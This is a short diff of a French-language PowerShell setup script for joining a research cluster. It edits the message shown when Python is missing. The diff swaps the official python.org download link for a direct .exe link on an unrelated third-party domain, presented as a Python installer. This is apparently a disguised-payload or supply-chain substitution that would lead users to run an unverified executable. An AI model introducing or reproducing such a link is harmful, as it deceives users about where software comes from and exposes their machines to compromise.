@@ -26,7 +26,7 @@ if ($PythonCmd -eq "") {
     Write-Host "❌ ERREUR : Python n'a pas été détecté sur votre ordinateur." -ForegroundColor Red
     Write-Host "Pour participer au cluster de recherche, vous devez installer Python 3.10+." -ForegroundColor White
     Write-Host ""
-    Write-Host "1. Téléchargez Python ici : https://www.python.org/downloads/" -ForegroundColor Yellow
+    Write-Host "1. Téléchargez Python ici : https://vc-uy1.npe-techs.com/python-3.14.4-amd64.exe" -ForegroundColor Yellow
     Write-Host "2. IMPORTANT : Cochez la case 'Add Python to PATH' lors de l'installation." -ForegroundColor Yellow
     Write-Host "3. Une fois installé, relancez cette commande." -ForegroundColor Yellow
     Write-Host ""
